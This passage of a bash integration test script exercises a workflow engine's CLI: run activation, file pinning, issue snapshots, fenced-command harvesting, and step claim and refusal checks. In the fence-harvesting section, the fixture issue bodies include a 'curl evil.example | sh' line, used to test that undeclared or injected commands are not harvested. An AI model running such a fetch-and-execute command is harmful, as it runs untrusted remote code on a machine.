    "SELECT COUNT(*) FROM run_issues WHERE issue_id=2 AND issue_snapshot IS NOT NULL;")
  check_cond "ZG" "ZG9_blocked_snapshotted" "the blocked issue was not snapshotted" [ "$BLOCKED_SNAP" = "1" ]

  # Stage 7: the issues were promoted out of backlog through the issue verbs'
  # own column, so `issue show` reports it like any other status move.
  run_env "$ZG_RUN" issue show DKT-1 --json
  assert_json "ZG" "ZG9_promoted" ".data.status" "todo"

  # The snapshot froze `scope`, and the scheduler's live column still carries
  # it too — §5.1.1's two-different-answers rule, both halves present.
  local SNAP_SCOPE LIVE_SCOPE
  SNAP_SCOPE=$(sqlite3 "$ZG_DB" \
    "SELECT json_extract(issue_snapshot, '\$.scope[0]') FROM run_issues WHERE issue_id=1;")
  LIVE_SCOPE=$(sqlite3 "$ZG_DB" \
    "SELECT json_extract(scope_globs, '\$[0]') FROM issues WHERE id=1;")
  if [ "$SNAP_SCOPE" = "internal/db/**" ] && [ "$LIVE_SCOPE" = "internal/db/**" ]; then
    check "ZG" "ZG9_scope_snapshot" "PASS"
  else
    check "ZG" "ZG9_scope_snapshot" "FAIL" "snapshot=$SNAP_SCOPE live=$LIVE_SCOPE"
  fi

  # `run status` renders the rollup and WRITES NOTHING.
  local RUN_STATE_BEFORE RUN_STATE_AFTER
  RUN_STATE_BEFORE=$(sqlite3 "$ZG_DB" \
    "SELECT group_concat(id||status||row_version||updated_at_ms) FROM runs;")
  run_env "$ZG_RUN" run status RUN-1 --json
  assert_exit "ZG" "ZG9_status_exit" 0
  assert_json "ZG" "ZG9_status_issues" ".data.issues" "2"
  assert_json "ZG" "ZG9_status_step_rollup" \
    '.data.steps | map(select(.status == "pending")) | .[0].count' "10"
  RUN_STATE_AFTER=$(sqlite3 "$ZG_DB" \
    "SELECT group_concat(id||status||row_version||updated_at_ms) FROM runs;")
  check_cond "ZG" "ZG9_status_writes_nothing" "`run status` mutated the run row" [ "$RUN_STATE_BEFORE" = "$RUN_STATE_AFTER" ]

  # Mid-run edit immunity (§9 item 5) at the CLI: edit the body and the title,
  # and the activation-time snapshot is unmoved.
  run_env "$ZG_RUN" issue edit DKT-1 -t "EDITED title" -d "EDITED body" --json
  assert_exit "ZG" "ZG9_edit" 0
  local SNAP_BODY SNAP_TITLE
  SNAP_BODY=$(sqlite3 "$ZG_DB" "SELECT body_snapshot FROM run_issues WHERE issue_id=1;")
  SNAP_TITLE=$(sqlite3 "$ZG_DB" \
    "SELECT json_extract(issue_snapshot, '\$.title') FROM run_issues WHERE issue_id=1;")
  if [ "$SNAP_BODY" = "the first body" ] && [ "$SNAP_TITLE" = "ZG9 first" ]; then
    check "ZG" "ZG9_snapshot_immune" "PASS"
  else
    check "ZG" "ZG9_snapshot_immune" "FAIL" "body=$SNAP_BODY title=$SNAP_TITLE"
  fi

  # ---------------------------------------------------------------------------
  # ZG10: --pin round-trip, and the §5.5 activation refusal matrix.
  # ---------------------------------------------------------------------------

  printf 'a contract core never reads the meaning of\n' > "$ZG_RUN/contract.md"
  local CONTRACT_SHA
  CONTRACT_SHA=$(shasum -a 256 "$ZG_RUN/contract.md" | cut -d' ' -f1)

  run_env "$ZG_RUN" issue create -t "ZG10 pinned" -d "a body" --json
  run_env "$ZG_RUN" run start --issue DKT-3 --json
  assert_json "ZG" "ZG10_start" ".data.run" "RUN-2"

  run_env "$ZG_RUN" run activate RUN-2 --pin "$ZG_RUN/contract.md" --json
  assert_exit "ZG" "ZG10_activate" 0
  # Four: the workflow, the --pin file, and TWO schemas. `aggregate@1` because
  # the fixture's `reconcile` step is `action = "aggregate"` and the builtin
  # pins like any other registered object it references (§4.7 P5); `findings@1`
  # because that same step DECLARES it (V29), which is what makes its
  # ordered `any(severity >= high)` evaluable at all.
  assert_json "ZG" "ZG10_pins_recorded" ".data.pins_recorded" "4"
  run_env "$ZG_RUN" run status RUN-2 --json
  assert_json "ZG" "ZG10_schema_pins" \
    '.data.pins | map(select(.kind == "schema")) | map(.ref) | sort | join(",")' \
    "aggregate@1,findings@1"

  run_env "$ZG_RUN" run status RUN-2 --json
  assert_json "ZG" "ZG10_workflow_pin" \
    '.data.pins | map(select(.kind == "workflow")) | .[0].ref' "standard-change@1"
  local PIN_SHA
  PIN_SHA=$(echo "$CMD_STDOUT" | jq -r '.data.pins | map(select(.kind == "file")) | .[0].sha256')
  check_cond "ZG" "ZG10_file_pin_hash" "pin hash $PIN_SHA, file hash $CONTRACT_SHA" [ "$PIN_SHA" = "$CONTRACT_SHA" ]

  # The workflow pin's hash is the REGISTERED bytes' hash, so a run can prove
  # which definition it ran against.
  local WF_PIN_SHA
  WF_PIN_SHA=$(echo "$CMD_STDOUT" | jq -r \
    '.data.pins | map(select(.kind == "workflow")) | .[0].sha256')
  run_env "$ZG_RUN" workflow show standard-change@1 --json
  local WF_SHA
  WF_SHA=$(echo "$CMD_STDOUT" | jq -r '.data.source_sha256')
  check_cond "ZG" "ZG10_workflow_pin_hash" "pin $WF_PIN_SHA, registered $WF_SHA" [ "$WF_PIN_SHA" = "$WF_SHA" ]

  # RA2: the pin set is INHERITED. Edit the pinned file on disk, re-activate,
  # and the recorded hash must not move — otherwise an in-flight run silently
  # adopts an edited contract.
  printf 'EDITED contract\n' > "$ZG_RUN/contract.md"
  run_env "$ZG_RUN" run activate RUN-2 --pin "$ZG_RUN/contract.md" --json
  assert_exit "ZG" "ZG10_reactivate" 0
  assert_json "ZG" "ZG10_reactivation_flag" ".data.reactivation" "true"
  run_env "$ZG_RUN" run status RUN-2 --json
  local PIN_SHA_AFTER
  PIN_SHA_AFTER=$(echo "$CMD_STDOUT" | jq -r \
    '.data.pins | map(select(.kind == "file")) | .[0].sha256')
  check_cond "ZG" "ZG10_pins_inherited" "re-activation re-pinned: $PIN_SHA_AFTER, want the original $CONTRACT_SHA" [ "$PIN_SHA_AFTER" = "$CONTRACT_SHA" ]

  # A --pin path that does not exist -> NOT_FOUND (2), and NOTHING is written:
  # pinning is never partial.
  run_env "$ZG_RUN" issue create -t "ZG10 unpinnable" -d "a body" --json
  run_env "$ZG_RUN" run start --issue DKT-4 --json
  local BAD_RUN
  BAD_RUN=$(echo "$CMD_STDOUT" | jq -r '.data.run')
  run_env "$ZG_RUN" run activate "$BAD_RUN" --pin "$ZG_RUN/contract.md" \
    --pin "$ZG_RUN/does-not-exist.md" --json
  assert_exit "ZG" "ZG10_missing_pin_exit" 2
  assert_json "ZG" "ZG10_missing_pin_code" ".code" "NOT_FOUND"

  local BAD_ID; BAD_ID="${BAD_RUN#RUN-}"
  local LEFTOVER
  LEFTOVER=$(sqlite3 "$ZG_DB" "SELECT
      (SELECT COUNT(*) FROM steps WHERE run_id=$BAD_ID)
    + (SELECT COUNT(*) FROM pins  WHERE run_id=$BAD_ID)
    + (SELECT COUNT(*) FROM run_issues WHERE run_id=$BAD_ID AND workflow_id IS NOT NULL);")
  check_cond "ZG" "ZG10_pin_atomicity" "$LEFTOVER rows survived a refused activation; the transaction is fat" [ "$LEFTOVER" = "0" ]
  run_env "$ZG_RUN" run status "$BAD_RUN" --json
  assert_json "ZG" "ZG10_refused_run_untouched" ".data.run.status" "planning"

  # An issue no workflow matches -> VALIDATION_ERROR (3) naming the issue AND
  # the candidates.
  run_env "$ZG_RUN" issue create -t "ZG10 epic" -d "a body" -T epic --json
  run_env "$ZG_RUN" run start --issue DKT-5 --json
  local EPIC_RUN
  EPIC_RUN=$(echo "$CMD_STDOUT" | jq -r '.data.run')
  run_env "$ZG_RUN" run activate "$EPIC_RUN" --json
  assert_exit "ZG" "ZG10_nomatch_exit" 3
  assert_json "ZG" "ZG10_nomatch_code" ".code" "VALIDATION_ERROR"
  assert_stdout_contains "ZG" "ZG10_nomatch_names_issue" "DKT-5"
  assert_stdout_contains "ZG" "ZG10_nomatch_names_candidates" "standard-change@1"

  # A run with no issues -> VALIDATION_ERROR (3).
  run_env "$ZG_RUN" run start --json
  local EMPTY_RUN
  EMPTY_RUN=$(echo "$CMD_STDOUT" | jq -r '.data.run')
  run_env "$ZG_RUN" run activate "$EMPTY_RUN" --json
  assert_exit "ZG" "ZG10_empty_exit" 3
  assert_json "ZG" "ZG10_empty_code" ".code" "VALIDATION_ERROR"

  # A run that does not exist -> NOT_FOUND (2).
  run_env "$ZG_RUN" run activate RUN-999 --json
  assert_exit "ZG" "ZG10_missing_run_exit" 2
  assert_json "ZG" "ZG10_missing_run_code" ".code" "NOT_FOUND"

  # RA5: a terminal run refuses re-activation -> CONFLICT (4).
  run_env "$ZG_RUN" run abandon RUN-2 --reason "superseded by ZG" --json
  assert_exit "ZG" "ZG10_abandon_exit" 0
  assert_json "ZG" "ZG10_abandoned" ".data.status" "abandoned"
  run_env "$ZG_RUN" run activate RUN-2 --json
  assert_exit "ZG" "ZG10_ra5_exit" 4
  assert_json "ZG" "ZG10_ra5_code" ".code" "CONFLICT"

  # `run abandon` without --reason is refused: "abandoned" alone does not
  # answer the question somebody asks later.
  run_env "$ZG_RUN" run abandon RUN-1 --json
  assert_exit "ZG" "ZG10_abandon_needs_reason" 3

  # pause / resume, and the refusal of an illegal transition. A no-op success
  # would let a harness believe it had quiesced a run that never was active.
  run_env "$ZG_RUN" run pause RUN-1 --reason "operator review" --json
  assert_exit "ZG" "ZG10_pause_exit" 0
  assert_json "ZG" "ZG10_paused" ".data.status" "waiting-human"
  assert_json "ZG" "ZG10_pause_reason" ".data.reason" "operator review"
  run_env "$ZG_RUN" run pause RUN-1 --reason "again" --json
  assert_exit "ZG" "ZG10_double_pause_exit" 4
  assert_json "ZG" "ZG10_double_pause_code" ".code" "CONFLICT"
  run_env "$ZG_RUN" run resume RUN-1 --json
  assert_exit "ZG" "ZG10_resume_exit" 0
  assert_json "ZG" "ZG10_resumed" ".data.status" "active"

  # `run status --active` excludes terminal runs; `planning` counts as active,
  # since a run that exists but has not been activated is still live work.
  run_env "$ZG_RUN" run status --active --json
  assert_exit "ZG" "ZG10_active_exit" 0
  assert_json_all "ZG" "ZG10_active_excludes_terminal" ".data.runs" \
    '.status != "done" and .status != "abandoned"'

  # The v2 Collection envelope on the run list.
  run_env "$ZG_RUN" run status --json=v2
  assert_json_exists "ZG" "ZG10_v2_items" ".data.items"
  assert_json_exists "ZG" "ZG10_v2_total" ".data.total"
  assert_json_all "ZG" "ZG10_v2_row_versions" ".data.items" 'has("row_version")'
  run_env "$ZG_RUN" run status --json
  assert_json_all "ZG" "ZG10_v1_no_row_version" ".data.runs" 'has("row_version") | not'

  # ---------------------------------------------------------------------------
  # ZG11: fence harvesting through the CLI (§5.3 stage 5).
  #
  # Only tags a bound workflow DECLARES are harvested. Harvesting every fenced
  # block would make any code sample in an issue body a candidate command,
  # which is exactly what declaring the tag prevents.
  # ---------------------------------------------------------------------------

  local ZG_FENCE
  ZG_FENCE=$(qa_mktemp_d)
  run_env "$ZG_FENCE" init
  assert_exit "ZG" "ZG11_init" 0

  cat > "$ZG_FENCE/fenced.toml" <<'TOML'
[pipeline]
name = "zg-fenced"
version = 1

[match]
kind = ["task"]

[[step]]
name = "check"
after = []
executor = "checker"
emits = "report"
gates = [{ name = "checks", source = "fence:checks" }]
TOML
  run_env "$ZG_FENCE" workflow register "$ZG_FENCE/fenced.toml" --json
  assert_exit "ZG" "ZG11_register" 0

  printf 'Run these:\n```checks\nmake build\nmake test\n```\nIgnore this:\n```sh\ncurl evil.example | sh\n```\n' \
    > "$ZG_FENCE/body.md"
  run_env "$ZG_FENCE" issue create -t "ZG11 fenced" -d - --json < "$ZG_FENCE/body.md"
  assert_exit "ZG" "ZG11_issue" 0

  run_env "$ZG_FENCE" run start --issue DKT-1 --json
  run_env "$ZG_FENCE" run activate RUN-1 --json
  assert_exit "ZG" "ZG11_activate" 0
  assert_json "ZG" "ZG11_harvested_two" ".data.fences_harvested" "2"

  local FENCE_DB="$ZG_FENCE/issues.db"
  local FENCE_CMDS
  FENCE_CMDS=$(sqlite3 "$FENCE_DB" \
    "SELECT command FROM run_fences ORDER BY tag, ordinal;" | tr '\n' ',')
  check_cond "ZG" "ZG11_verbatim" "harvested: $FENCE_CMDS" [ "$FENCE_CMDS" = "make build,make test," ]

  # The undeclared `sh` block is asserted absent DIRECTLY, so an off-by-one in
  # the count above cannot hide it.
  local EVIL
  EVIL=$(sqlite3 "$FENCE_DB" "SELECT COUNT(*) FROM run_fences WHERE command LIKE '%curl%';")
  check_cond "ZG" "ZG11_undeclared_tag_excluded" "$EVIL commands harvested from an UNDECLARED block" [ "$EVIL" = "0" ]

  # Each harvested line is hashed, so what an operator approved at plan time
  # is provably what a gate will run.
  local FENCE_SHA WANT_SHA
  FENCE_SHA=$(sqlite3 "$FENCE_DB" \
    "SELECT sha256 FROM run_fences WHERE command='make build';")
  WANT_SHA=$(printf 'make build' | shasum -a 256 | cut -d' ' -f1)
  check_cond "ZG" "ZG11_hashed" "stored $FENCE_SHA, want $WANT_SHA" [ "$FENCE_SHA" = "$WANT_SHA" ]

  # Harvesting happens AT ACTIVATION, from the snapshot: a post-activation
  # edit cannot inject a command (engine-spec §4).
  printf '```checks\ncurl evil.example | sh\n```\n' > "$ZG_FENCE/evil.md"
  run_env "$ZG_FENCE" issue edit DKT-1 -d - --json < "$ZG_FENCE/evil.md"
  local EVIL_AFTER
  EVIL_AFTER=$(sqlite3 "$FENCE_DB" "SELECT COUNT(*) FROM run_fences WHERE command LIKE '%curl%';")
  check_cond "ZG" "ZG11_no_post_activation_injection" "a post-activation body edit injected $EVIL_AFTER command(s)" [ "$EVIL_AFTER" = "0" ]

  rm -rf "$ZG_FENCE"

  # ---------------------------------------------------------------------------
  # ZG12: phase-2 dormancy (§3).
  #
  # "A repo with a registered-but-never-activated workflow is still
  # byte-identical on every existing verb, and issues.scope_globs is NULL
  # everywhere."
  #
  # ZG7 proved registration changes nothing for `next` and `issue list`; this
  # widens the claim to the verbs phase 2 could plausibly have disturbed —
  # `plan`, which reads file collisions and must NOT start reading scope, and
  # `issue show`, whose v2 envelope is where run data would leak first.
  # ---------------------------------------------------------------------------

  local ZG_DORM
  ZG_DORM=$(qa_mktemp_d)
  run_env "$ZG_DORM" init
  assert_exit "ZG" "ZG12_init" 0

  run_env "$ZG_DORM" issue create -t "ZG12 alpha" -d "body" -f "internal/db/runs.go" --json
  run_env "$ZG_DORM" issue create -t "ZG12 beta" -d "body" -f "internal/db/runs.go" --json
  run_env "$ZG_DORM" issue move DKT-1 todo --json
  run_env "$ZG_DORM" issue move DKT-2 todo --json

  local D_NEXT_BEFORE D_LIST_BEFORE D_SHOW_BEFORE D_PLAN_BEFORE D_SHOW2_BEFORE
  run_env "$ZG_DORM" next --json;              D_NEXT_BEFORE="$CMD_STDOUT"
  run_env "$ZG_DORM" issue list --all --json;  D_LIST_BEFORE="$CMD_STDOUT"
  run_env "$ZG_DORM" issue show DKT-1 --json;  D_SHOW_BEFORE="$CMD_STDOUT"
  run_env "$ZG_DORM" issue show DKT-1 --json=v2; D_SHOW2_BEFORE="$CMD_STDOUT"
  run_env "$ZG_DORM" plan --json;              D_PLAN_BEFORE="$CMD_STDOUT"

  if [ -n "$D_NEXT_BEFORE" ] && [ -n "$D_PLAN_BEFORE" ] && [ -n "$D_SHOW2_BEFORE" ]; then
    check "ZG" "ZG12_nonempty" "PASS"
  else
    check "ZG" "ZG12_nonempty" "FAIL" "the pre-registration reads were empty"
  fi

  run_env "$ZG_DORM" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_DORM" workflow register "$FIXTURE" --json
  assert_exit "ZG" "ZG12_register" 0

  local D_NEXT_AFTER D_LIST_AFTER D_SHOW_AFTER D_PLAN_AFTER D_SHOW2_AFTER
  run_env "$ZG_DORM" next --json;              D_NEXT_AFTER="$CMD_STDOUT"
  run_env "$ZG_DORM" issue list --all --json;  D_LIST_AFTER="$CMD_STDOUT"
  run_env "$ZG_DORM" issue show DKT-1 --json;  D_SHOW_AFTER="$CMD_STDOUT"
  run_env "$ZG_DORM" issue show DKT-1 --json=v2; D_SHOW2_AFTER="$CMD_STDOUT"
  run_env "$ZG_DORM" plan --json;              D_PLAN_AFTER="$CMD_STDOUT"

  local DORM_DIFFS=""
  [ "$D_NEXT_BEFORE"  = "$D_NEXT_AFTER"  ] || DORM_DIFFS="$DORM_DIFFS next"
  [ "$D_LIST_BEFORE"  = "$D_LIST_AFTER"  ] || DORM_DIFFS="$DORM_DIFFS issue-list"
  [ "$D_SHOW_BEFORE"  = "$D_SHOW_AFTER"  ] || DORM_DIFFS="$DORM_DIFFS issue-show-v1"
  [ "$D_SHOW2_BEFORE" = "$D_SHOW2_AFTER" ] || DORM_DIFFS="$DORM_DIFFS issue-show-v2"
  [ "$D_PLAN_BEFORE"  = "$D_PLAN_AFTER"  ] || DORM_DIFFS="$DORM_DIFFS plan"

  check_cond "ZG" "ZG12_registered_but_unactivated" "registering a workflow changed:$DORM_DIFFS" [ -z "$DORM_DIFFS" ]

  # scope_globs is NULL on every row: `issue create` without --scope is the
  # unmodified v6 path, and nothing else writes the column.
  local D_SCOPED
  D_SCOPED=$(sqlite3 "$ZG_DORM/issues.db" \
    "SELECT COUNT(*) FROM issues WHERE scope_globs IS NOT NULL;")
  check_cond "ZG" "ZG12_scope_globs_null" "$D_SCOPED issues carry scope_globs without --scope ever being used" [ "$D_SCOPED" = "0" ]

  # And the activation tables are empty: a registered workflow schedules
  # nothing until somebody activates a run.
  local D_ROWS
  D_ROWS=$(sqlite3 "$ZG_DORM/issues.db" "SELECT
      (SELECT COUNT(*) FROM runs) + (SELECT COUNT(*) FROM run_issues)
    + (SELECT COUNT(*) FROM steps) + (SELECT COUNT(*) FROM pins)
    + (SELECT COUNT(*) FROM run_fences);")
  check_cond "ZG" "ZG12_activation_tables_empty" "$D_ROWS activation rows in a repo that never activated" [ "$D_ROWS" = "0" ]

  # `--scope` writes the column, and ONLY when given — an edit that never
  # mentions it leaves the declaration alone.
  run_env "$ZG_DORM" issue edit DKT-1 --scope 'internal/**' --json
  assert_exit "ZG" "ZG12_scope_edit" 0
  local D_SCOPE_SET
  D_SCOPE_SET=$(sqlite3 "$ZG_DORM/issues.db" "SELECT scope_globs FROM issues WHERE id=1;")
  check_cond "ZG" "ZG12_scope_written" "scope_globs=$D_SCOPE_SET" [ "$D_SCOPE_SET" = '["internal/**"]' ]

  run_env "$ZG_DORM" issue edit DKT-1 -t "retitled" --json
  local D_SCOPE_KEPT
  D_SCOPE_KEPT=$(sqlite3 "$ZG_DORM/issues.db" "SELECT scope_globs FROM issues WHERE id=1;")
  check_cond "ZG" "ZG12_scope_preserved" "an edit that never mentioned --scope changed it to $D_SCOPE_KEPT" [ "$D_SCOPE_KEPT" = '["internal/**"]' ]

  # DKT-2 never declared a scope, so it stays NULL — the dormant default.
  local D_SCOPE_OTHER
  D_SCOPE_OTHER=$(sqlite3 "$ZG_DORM/issues.db" \
    "SELECT COUNT(*) FROM issues WHERE id=2 AND scope_globs IS NULL;")
  check_cond "ZG" "ZG12_scope_still_null" "an untouched issue gained a scope" [ "$D_SCOPE_OTHER" = "1" ]


  # ---------------------------------------------------------------------------
  # ZG13: the full step cycle — activate, next --run, claim, complete (§6).
  #
  # The Go tests drive the saga in-process; this proves the whole path — CLI,
  # token transport, envelope, exit codes, and the rows that land — works
  # against a database an operator built with the ordinary verbs.
  #
  # NOTE ON GATES AND ACTIONS: both are REAL. Gates landed at stage 4 — this
  # section trusts them below and asserts the recorded argv, exit code, and the
  # absence of `stub`. The ACTION runner landed at stage 5: `aggregate` is
  # computed by core and every other action name is a user-trusted command
  # through the same trust/exec path a gate takes. The stub that made the S3-S5
  # window auditable is retired with its marker, and what replaced it as the
  # audit record is an `action_results` row — which says more than a boolean
  # could, since it names the verdict, the argv, and whether core computed it.
  # ---------------------------------------------------------------------------

  local ZG_S
  ZG_S=$(qa_mktemp_d)
  run_env "$ZG_S" init
  assert_exit "ZG" "ZG13_init" 0
  run_env "$ZG_S" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_S" workflow register "$FIXTURE" --json
  assert_exit "ZG" "ZG13_register" 0
  run_env "$ZG_S" issue create -t "ZG13 subject" -d "the request body" --json
  assert_exit "ZG" "ZG13_issue" 0
  run_env "$ZG_S" run start --issue DKT-1 --json
  assert_exit "ZG" "ZG13_start" 0
  run_env "$ZG_S" run activate RUN-1 --json
  assert_exit "ZG" "ZG13_activate" 0

  # THE GATES ARE REAL NOW (stage 4). The fixture's `implement` step declares
  # five named gates; each is trusted here to a WITNESS command that creates a
  # sentinel file, so "the gate ran" is proven by the filesystem rather than by
  # a row the engine wrote about itself.
  #
  # SB5 first: this is the first section to touch the trust store, and running
  # it against the operator's real one would write entries into their config.
  assert_trust_sandbox
  local ZG_WITNESS="$ZG_S/witness"
  mkdir -p "$ZG_WITNESS"
  local ZG_GATE
  for ZG_GATE in build tests scope self-hygiene secret-scan; do
    run_env "$ZG_S" trust add "$ZG_GATE" --yes -- \
      /usr/bin/touch "$ZG_WITNESS/$ZG_GATE"
    assert_exit "ZG" "ZG13_trust_$ZG_GATE" 0
  done

  # `next --run` offers exactly one CLAIMABLE row — the root step; everything
  # else has an unmet `after` and rides behind it as the `staged` closure
  # (status=staged, stage>0), never as ready.
  run_env "$ZG_S" next --run RUN-1 --json
  assert_exit "ZG" "ZG13_next" 0
  assert_json "ZG" "ZG13_next_one" \
    '[.data.steps[] | select(.status=="ready")] | length' "1"
  assert_json "ZG" "ZG13_next_instance" '.data.steps[0].instance' "implement@0"
  # `ready` is COMPUTED (§6.2) — the stored column says `pending`.
  assert_json "ZG" "ZG13_next_ready" '.data.steps[0].status' "ready"
  local ZG_STORED
  ZG_STORED=$(sqlite3 "$ZG_S/issues.db" \
    "SELECT status FROM steps WHERE instance='implement@0';")
  check_cond "ZG" "ZG13_ready_not_persisted" "stored status is $ZG_STORED; \`ready\` must never be persisted" [ "$ZG_STORED" = "pending" ]

  # The §11.4 next-row shape, field for field.
  local ZG_KEY
  for ZG_KEY in step instance issue run kind executor class attempt \
                expected_cost lease_ttl_s status; do
    assert_json_exists "ZG" "ZG13_row_$ZG_KEY" ".data.steps[0].$ZG_KEY"
  done

  # Claim: token AND the full context bundle in ONE response (§6.6).
  run_env "$ZG_S" step claim STEP-1 --owner zg-worker --json
  assert_exit "ZG" "ZG13_claim" 0
  assert_json_exists "ZG" "ZG13_claim_token" ".data.token"
  assert_json_exists "ZG" "ZG13_claim_context" ".data.context"
  # The subject key is `step`, verbatim per §11.4 — which is what closes
  # the recorded deviation (§6.4.1).
  assert_json "ZG" "ZG13_claim_subject" ".data.step" "STEP-1"
  # The bundle reads the SNAPSHOT, never the live issue.
  assert_json "ZG" "ZG13_ctx_body" ".data.context.issue.body_snapshot" "the request body"
  assert_json "ZG" "ZG13_ctx_title" ".data.context.issue.title" "ZG13 subject"

  local ZG_TOKEN
  ZG_TOKEN=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')

  # `step context` re-emits the bundle READ-ONLY, no token required (§11.4).
  run_env "$ZG_S" step context STEP-1 --json
  assert_exit "ZG" "ZG13_context_no_token" 0
  assert_json "ZG" "ZG13_context_body" \
    ".data.context.issue.body_snapshot" "the request body"

  # --meta rides as a SIBLING object, so asking for it does not change the
  # bundle the goldens compare (§6.4).
  run_env "$ZG_S" step context STEP-1 --meta --json
  assert_exit "ZG" "ZG13_meta" 0
  assert_json_exists "ZG" "ZG13_meta_sibling" ".data.meta.total_bytes"
  local ZG_PLAIN ZG_WITHMETA
  run_env "$ZG_S" step context STEP-1 --json
  ZG_PLAIN=$(printf '%s' "$CMD_STDOUT" | jq -S '.data.context')
  run_env "$ZG_S" step context STEP-1 --meta --json
  ZG_WITHMETA=$(printf '%s' "$CMD_STDOUT" | jq -S '.data.context')
  check_cond "ZG" "ZG13_meta_does_not_mutate" "--meta changed the bundle; the goldens would depend on a flag" [ "$ZG_PLAIN" = "$ZG_WITHMETA" ]

  # `step render` produces a packet from the shipped template.
  run_env "$ZG_S" step render STEP-1
  assert_exit "ZG" "ZG13_render" 0
  assert_stdout_contains "ZG" "ZG13_render_step" "implement@0"
  assert_stdout_contains "ZG" "ZG13_render_emits" "change-summary"

  # Complete: the saga runs to `done`.
  printf 'the change summary\n' >"$ZG_TMP/artifact.txt"
  DOCKET_TOKEN="$ZG_TOKEN" run_env "$ZG_S" step complete STEP-1 \
    --artifact-file "$ZG_TMP/artifact.txt" --json
  assert_exit "ZG" "ZG13_complete" 0

  local ZG_DONE
  ZG_DONE=$(sqlite3 "$ZG_S/issues.db" \
    "SELECT status || '|' || COALESCE(routing,'') || '|' || COALESCE(saga_stage,'-')
       FROM steps WHERE instance='implement@0';")
  if [ "$ZG_DONE" = "done|pass|-" ]; then
    check "ZG" "ZG13_saga_complete" "PASS"
  else
    check "ZG" "ZG13_saga_complete" "FAIL" "status|routing|saga = $ZG_DONE"
  fi

  # The token RETIRED when the artifact recorded (§6.8's hinge).
  local ZG_LEASE
  ZG_LEASE=$(sqlite3 "$ZG_S/issues.db" \
    "SELECT COUNT(*) FROM steps WHERE instance='implement@0' AND owner IS NULL;")
  check_cond "ZG" "ZG13_token_retired" "the lease survived the artifact record" [ "$ZG_LEASE" = "1" ]

  # Every gate the fixture declares recorded a REAL result in `gate_results`
  # (v8): a real argv, a real exit code, and NO stub marker.
  local ZG_GATES ZG_STUBS ZG_PASSED
  ZG_GATES=$(sqlite3 "$ZG_S/issues.db" \
    "SELECT COUNT(*) FROM gate_results gr
       JOIN steps s ON s.id = gr.step_id WHERE s.instance='implement@0';")
  ZG_STUBS=$(sqlite3 "$ZG_S/issues.db" \
    "SELECT COUNT(*) FROM gate_results gr
       JOIN steps s ON s.id = gr.step_id
      WHERE s.instance='implement@0' AND gr.stub = 1;")
  if [ "$ZG_GATES" = "5" ] && [ "$ZG_STUBS" = "0" ]; then
    check "ZG" "ZG13_gates_recorded" "PASS"
  else
    check "ZG" "ZG13_gates_recorded" "FAIL" \
      "$ZG_GATES gate results, $ZG_STUBS marked stub (want 5 results, 0 stubs)"
  fi

  # A real argv and a real exit code on every one — T11's forgery check, as an
  # assertion rather than a promise. `argv` is NULL and `exit` is NULL only on
  # an unmatched gate, and none of these is unmatched.
  ZG_PASSED=$(sqlite3 "$ZG_S/issues.db" \
    "SELECT COUNT(*) FROM gate_results gr
       JOIN steps s ON s.id = gr.step_id
      WHERE s.instance='implement@0' AND gr.verdict='pass'
        AND gr.exit = 0 AND gr.argv LIKE '%touch%';")
  check_cond "ZG" "ZG13_gates_real_argv_exit" "$ZG_PASSED gates recorded a real argv and exit 0 (want 5)" [ "$ZG_PASSED" = "5" ]

  # And the FILESYSTEM agrees: each witness sentinel exists, so a process
  # really ran. A row the engine wrote about itself proves nothing on its own.
  local ZG_SENTINELS
  ZG_SENTINELS=$(find "$ZG_WITNESS" -type f 2>/dev/null | wc -l | tr -d ' ')
  check_cond "ZG" "ZG13_gates_actually_executed" "$ZG_SENTINELS witness sentinels exist (want 5) — gates did not execute" [ "$ZG_SENTINELS" = "5" ]

  # `stub` is ABSENT from the JSON, not merely false (§4.2's omitempty).
  if sqlite3 "$ZG_S/issues.db" \
       "SELECT COUNT(*) FROM gate_results WHERE stub = 1;" | grep -q '^0$'; then
    check "ZG" "ZG13_no_stub_rows" "PASS"
  else
    check "ZG" "ZG13_no_stub_rows" "FAIL" "a stage-4 result carries stub=1"
  fi

  # The next steps became ready: the fanout. The chain behind it rides staged.
  run_env "$ZG_S" next --run RUN-1 --json
  assert_json "ZG" "ZG13_fanout_ready" \
    '[.data.steps[] | select(.status=="ready")] | length' "4"
  assert_json "ZG" "ZG13_fanout_first" '.data.steps[0].instance' "review@0#0"

  # ---------------------------------------------------------------------------
  # ZG14: the §6.9 refusal matrix, by EXIT CODE and by .code — each followed by
  # a version-unchanged assertion, because A REFUSAL NEVER WRITES.
  # ---------------------------------------------------------------------------

  local ZG_V_BEFORE ZG_V_AFTER
  zg_step_version() {
    sqlite3 "$ZG_S/issues.db" "SELECT row_version FROM steps WHERE id=$1;"
  }

  # R1: no token supplied.
  ZG_V_BEFORE=$(zg_step_version 2)
  run_env "$ZG_S" step complete STEP-2 --artifact-file "$ZG_TMP/artifact.txt" --json
  assert_exit "ZG" "ZG14_R1_exit" 3
  assert_json "ZG" "ZG14_R1_code" ".code" "VALIDATION_ERROR"
  ZG_V_AFTER=$(zg_step_version 2)
  check_cond "ZG" "ZG14_R1_no_write" "row_version moved on a refusal" [ "$ZG_V_BEFORE" = "$ZG_V_AFTER" ]

  # R2: token supplied, step unclaimed.
  ZG_V_BEFORE=$(zg_step_version 2)
  DOCKET_TOKEN=deadbeef run_env "$ZG_S" step complete STEP-2 \
    --artifact-file "$ZG_TMP/artifact.txt" --json
  assert_exit "ZG" "ZG14_R2_exit" 5
  assert_json "ZG" "ZG14_R2_code" ".code" "AUTH_ERROR"
  ZG_V_AFTER=$(zg_step_version 2)
  check_cond "ZG" "ZG14_R2_no_write" "row_version moved on a refusal" [ "$ZG_V_BEFORE" = "$ZG_V_AFTER" ]

  # R3 and R5 need a LIVE lease; R4 needs an EXPIRED one. They are deliberately
  # given SEPARATE claims rather than sharing one short-TTL lease: with a single
  # 1s lease, the three subprocess invocations between the claim and R5's
  # assertion can outlast it on a loaded runner, and R3's AUTH_ERROR silently
  # becomes STALE_LEASE while R5's CONFLICT becomes a success. The matrix would
  # then be testing the clock rather than the refusals.
  #
  # So: a LONG TTL for the live cases, and a separate short one for R4.
  run_env "$ZG_S" step claim STEP-2 --owner zg-worker --ttl 10m --json
  assert_exit "ZG" "ZG14_claim_for_matrix" 0

  # R3: token supplied, wrong value.
  ZG_V_BEFORE=$(zg_step_version 2)
